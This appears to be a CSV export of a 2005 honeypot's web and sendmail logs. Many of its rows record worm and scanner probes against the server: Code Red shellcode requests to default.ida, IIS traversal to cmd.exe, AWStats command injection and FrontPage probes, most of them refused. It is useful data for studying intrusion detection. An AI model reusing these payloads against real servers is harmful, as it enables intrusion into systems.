,Epoch Date,Log Type,IP Adress,Log
169,1110863219,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
170,1110863220,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
171,1110863220,access_log,81.181.146.13," ""GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 500 1097 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
172,1110863220,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
173,1110863220,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
174,1110863220,access_log,81.181.146.13," ""GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
175,1110863220,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
176,1110863220,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
177,1110863220,access_log,81.181.146.13," ""GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
178,1110863221,access_log,81.181.146.13," ""GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
179,1110863221,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
180,1110863222,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
181,1110863224,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
182,1110868873,access_log,201.9.48.227," ""GET /default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a HTTP/1.0"" 404 1061 ""-"" ""-"""
183,1110873194,access_log,217.204.59.69," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
184,1110885842,access_log,218.6.162.19," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
185,1110899269,access_log,24.11.17.100," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
186,1110913113,access_log,65.96.54.37," ""GET /NULL.printer"" 404 1061 ""-"" ""-"""
187,1110925233,access_log,195.70.152.248," ""GET /NULL.printer"" 404 1061 ""-"" ""-"""
188,1110930324,access_log,62.6.139.11," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
189,1110931788,access_log,211.158.94.106," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
190,1110934902,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
191,1110934902,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
192,1110934902,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
193,1110934902,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
194,1110934902,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
195,1110934902,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
196,1110934902,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
197,1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
198,1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
199,1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
200,1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
201,1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
202,1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
203,1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
204,1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
205,1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
206,1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
207,1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
208,1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
209,1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
210,1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
211,1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
212,1110934903,access_log,207.228.251.216," ""GET /sumthin HTTP/1.0"" 404 1061 ""-"" ""-"""
213,1110941142,access_log,218.11.95.43," ""GET /scripts/root.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
214,1110941146,access_log,218.11.95.43," ""GET /MSADC/root.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
215,1110941150,access_log,218.11.95.43," ""GET /c/winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
216,1110941154,access_log,218.11.95.43," ""GET /d/winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
217,1110941155,access_log,218.11.95.43," ""GET /scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
218,1110941160,access_log,218.11.95.43," ""GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
219,1110941161,access_log,218.11.95.43," ""GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
220,1110941162,access_log,218.11.95.43," ""GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
221,1110951640,access_log,69.67.42.139," ""GET /scripts/nsiislog.dll HTTP/1.1"" 404 1050 ""-"" ""-"""
222,1110953496,access_log,66.134.74.113," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
223,1110958184,access_log,204.102.106.121," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
224,1110962881,access_log,68.166.35.226," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
225,1110963224,access_log,61.10.7.209," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
226,1110965655,access_log,207.243.156.65," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
227,1110969323,access_log,71.16.50.10," ""GET /scripts/root.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
228,1110969324,access_log,71.16.50.10," ""GET /MSADC/root.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
229,1110969324,access_log,71.16.50.10," ""GET /c/winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
230,1110969325,access_log,71.16.50.10," ""GET /d/winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
231,1110969325,access_log,71.16.50.10," ""GET /scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
232,1110969325,access_log,71.16.50.10," ""GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
233,1110969326,access_log,71.16.50.10," ""GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
234,1110969326,access_log,71.16.50.10," ""GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
235,1110969326,access_log,71.16.50.10," ""GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
236,1110969327,access_log,71.16.50.10," ""GET /scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
237,1110969327,access_log,71.16.50.10," ""GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
238,1110969327,access_log,71.16.50.10," ""GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
239,1110969327,access_log,71.16.50.10," ""GET /scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 400 974 ""-"" ""-"""
240,1110969328,access_log,71.16.50.10," ""GET /scripts/..%%35c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 400 974 ""-"" ""-"""
241,1110969328,access_log,71.16.50.10," ""GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
242,1110969328,access_log,71.16.50.10," ""GET /scripts/..%252f../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
243,1110976930,access_log,66.171.199.116," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
244,1110979420,access_log,64.83.24.184," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
245,1110980816,access_log,66.30.71.74," ""GET /NULL.printer"" 404 1061 ""-"" ""-"""
246,1110983346,access_log,208.62.177.10," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
247,1110983368,access_log,209.120.201.177," ""GET /scripts/root.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
248,1110983369,access_log,209.120.201.177," ""GET /MSADC/root.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
249,1110983371,access_log,209.120.201.177," ""GET /c/winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
250,1110983372,access_log,209.120.201.177," ""GET /d/winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
251,1110983373,access_log,209.120.201.177," ""GET /scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
252,1110983374,access_log,209.120.201.177," ""GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
253,1110983375,access_log,209.120.201.177," ""GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
254,1110983376,access_log,209.120.201.177," ""GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
255,1110983378,access_log,209.120.201.177," ""GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
256,1110983379,access_log,209.120.201.177," ""GET /scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
257,1110983381,access_log,209.120.201.177," ""GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
258,1110983382,access_log,209.120.201.177," ""GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
259,1110983383,access_log,209.120.201.177," ""GET /scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 400 974 ""-"" ""-"""
260,1110983384,access_log,209.120.201.177," ""GET /scripts/..%%35c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 400 974 ""-"" ""-"""
261,1110983385,access_log,209.120.201.177," ""GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
262,1110983386,access_log,209.120.201.177," ""GET /scripts/..%252f../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
263,1110987905,access_log,65.16.76.54," ""POST /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1"" 404 1062 ""-"" ""-"""
264,1110988230,access_log,65.16.76.54," ""POST /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1"" 404 1062 ""-"" ""-"""
265,1110997397,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
266,1110997397,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
267,1110997398,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
268,1110997397,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
269,1110997398,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
270,1110997398,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
271,1110997398,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
272,1110997399,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
273,1110997398,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
274,1110997399,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
275,1110997400,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
276,1110997400,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
277,1110997401,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
278,1110997401,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
279,1110997401,access_log,218.85.9.143," ""GET http://www.intel.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"""
280,1111000130,access_log,67.81.23.243," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
281,1111002115,access_log,202.122.16.7," ""POST /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1"" 404 1063 ""-"" ""-"""
282,1111002561,access_log,220.170.151.237," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
283,1111005318,access_log,64.83.24.184," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
284,1111018092,access_log,222.166.160.138," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
285,1111034535,access_log,61.10.7.45," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
286,1111037480,access_log,69.107.121.41," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
287,1111038184,access_log,201.9.104.83," ""GET /default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a HTTP/1.0"" 404 1061 ""-"" ""-"""
288,1111047996,access_log,207.10.54.33," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
289,1111050725,access_log,68.98.176.140," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
290,1111053985,access_log,68.250.190.161," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
291,1111059507,access_log,219.150.244.58," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
292,1110687376,mail_log,-,"combo sendmail[26065]: j2D9FD3X026065: from=root, size=39455, class=0, nrcpts=1, msgid=<200503130915.j2D9FD3X026065@combo.honeypotbox.com>, relay=root@localhost"
293,1110687394,mail_log,127.0.0.1,"combo sendmail[26067]: j2D9GH6S026067: from=<root@combo.honeypotbox.com>, size=39751, class=0, nrcpts=1, msgid=<200503130915.j2D9FD3X026065@combo.honeypotbox.com>, proto=ESMTP, daemon=MTA, relay=localhost.localdomain [127.0.0.1]"
294,1110687394,mail_log,127.0.0.1,"combo sendmail[26065]: j2D9FD3X026065: to=root, ctladdr=root (0/0), delay=00:01:21, xdelay=00:00:17, mailer=relay, pri=30241, relay=[127.0.0.1] [127.0.0.1], dsn=2.0.0, stat=Sent (j2D9GH6S026067 Message accepted for delivery)"
295,1110687394,mail_log,-,"combo sendmail[26068]: j2D9GH6S026067: to=<root@combo.honeypotbox.com>, ctladdr=<root@combo.honeypotbox.com> (0/0), delay=00:00:01, xdelay=00:00:00, mailer=local, pri=69989, dsn=2.0.0, stat=Sent"
296,1110773182,mail_log,-,"combo sendmail[10169]: j2E96MKL010169: from=root, size=1045, class=0, nrcpts=1, msgid=<200503140906.j2E96MKL010169@combo.honeypotbox.com>, relay=root@localhost"
297,1110773207,mail_log,127.0.0.1,"combo sendmail[10172]: j2E96M6S010172: from=<root@combo.honeypotbox.com>, size=1359, class=0, nrcpts=1, msgid=<200503140906.j2E96MKL010169@combo.honeypotbox.com>, proto=ESMTP, daemon=MTA, relay=localhost.localdomain [127.0.0.1]"
298,1110773207,mail_log,127.0.0.1,"combo sendmail[10169]: j2E96MKL010169: to=root, ctladdr=root (0/0), delay=00:00:25, xdelay=00:00:25, mailer=relay, pri=30056, relay=[127.0.0.1] [127.0.0.1], dsn=2.0.0, stat=Sent (j2E96M6S010172 Message accepted for delivery)"
299,1110773207,mail_log,-,"combo sendmail[10173]: j2E96M6S010172: to=<root@combo.honeypotbox.com>, ctladdr=<root@combo.honeypotbox.com> (0/0), delay=00:00:00, xdelay=00:00:00, mailer=local, pri=31602, dsn=2.0.0, stat=Sent"
300,1110773897,mail_log,-,"combo sendmail[10384]: j2E9HFPa010384: from=root, size=39406, class=0, nrcpts=1, msgid=<200503140917.j2E9HFPa010384@combo.honeypotbox.com>, relay=root@localhost"
301,1110773915,mail_log,127.0.0.1,"combo sendmail[10386]: j2E9II6S010386: from=<root@combo.honeypotbox.com>, size=39702, class=0, nrcpts=1, msgid=<200503140917.j2E9HFPa010384@combo.honeypotbox.com>, proto=ESMTP, daemon=MTA, relay=localhost.localdomain [127.0.0.1]"
302,1110773915,mail_log,127.0.0.1,"combo sendmail[10384]: j2E9HFPa010384: to=root, ctladdr=root (0/0), delay=00:01:20, xdelay=00:00:17, mailer=relay, pri=30241, relay=[127.0.0.1] [127.0.0.1], dsn=2.0.0, stat=Sent (j2E9II6S010386 Message accepted for delivery)"
303,1110773916,mail_log,-,"combo sendmail[10387]: j2E9II6S010386: to=<root@combo.honeypotbox.com>, ctladdr=<root@combo.honeypotbox.com> (0/0), delay=00:00:01, xdelay=00:00:01, mailer=local, pri=69940, dsn=2.0.0, stat=Sent"
304,1110844066,mail_log,211.158.69.89,combo sendmail[12661]: j2F4lk6S012661: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
305,1110844066,mail_log,211.158.69.89,combo sendmail[12651]: j2F4lk6S012651: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
306,1110844066,mail_log,211.158.69.89,combo sendmail[12652]: j2F4lk6S012652: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
307,1110844066,mail_log,211.158.69.89,combo sendmail[12656]: j2F4lk6S012656: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
308,1110844066,mail_log,211.158.69.89,combo sendmail[12662]: j2F4lk6S012662: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
309,1110844066,mail_log,211.158.69.89,combo sendmail[12644]: j2F4lk6S012644: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
310,1110844066,mail_log,211.158.69.89,combo sendmail[12653]: j2F4lk6S012653: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
311,1110844066,mail_log,211.158.69.89,combo sendmail[12659]: j2F4lk6S012659: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
312,1110844066,mail_log,211.158.69.89,combo sendmail[12650]: j2F4lk6S012650: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
313,1110844066,mail_log,211.158.69.89,combo sendmail[12649]: j2F4lk6S012649: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
314,1110844066,mail_log,211.158.69.89,combo sendmail[12643]: j2F4lk6S012643: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
315,1110844066,mail_log,211.158.69.89,combo sendmail[12645]: j2F4lk6S012645: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
316,1110844066,mail_log,211.158.69.89,combo sendmail[12646]: j2F4lk6S012646: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
317,1110844066,mail_log,211.158.69.89,combo sendmail[12648]: j2F4lk6S012648: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
318,1110844066,mail_log,211.158.69.89,combo sendmail[12658]: j2F4lk6S012658: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
319,1110844066,mail_log,211.158.69.89,combo sendmail[12657]: j2F4lk6S012657: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
320,1110844066,mail_log,211.158.69.89,combo sendmail[12647]: j2F4lk6S012647: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
321,1110844066,mail_log,211.158.69.89,combo sendmail[12660]: j2F4lk6S012660: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
322,1110844066,mail_log,211.158.69.89,combo sendmail[12654]: j2F4lk6S012654: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
323,1110844066,mail_log,211.158.69.89,combo sendmail[12655]: j2F4lk6S012655: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
324,1110844066,mail_log,211.158.69.89,combo sendmail[12663]: j2F4lk6S012663: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
325,1110844066,mail_log,211.158.69.89,combo sendmail[12664]: j2F4lk6S012664: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
326,1110859452,mail_log,-,"combo sendmail[13333]: j2F94C4d013333: from=root, size=1145, class=0, nrcpts=1, msgid=<200503150904.j2F94C4d013333@combo.honeypotbox.com>, relay=root@localhost"
327,1110859476,mail_log,127.0.0.1,"combo sendmail[13336]: j2F94C6S013336: from=<root@combo.honeypotbox.com>, size=1459, class=0, nrcpts=1, msgid=<200503150904.j2F94C4d013333@combo.honeypotbox.com>, proto=ESMTP, daemon=MTA, relay=localhost.localdomain [127.0.0.1]"
328,1110859476,mail_log,127.0.0.1,"combo sendmail[13333]: j2F94C4d013333: to=root, ctladdr=root (0/0), delay=00:00:24, xdelay=00:00:24, mailer=relay, pri=30056, relay=[127.0.0.1] [127.0.0.1], dsn=2.0.0, stat=Sent (j2F94C6S013336 Message accepted for delivery)"
329,1110859476,mail_log,-,"combo sendmail[13337]: j2F94C6S013336: to=<root@combo.honeypotbox.com>, ctladdr=<root@combo.honeypotbox.com> (0/0), delay=00:00:00, xdelay=00:00:00, mailer=local, pri=31702, dsn=2.0.0, stat=Sent"
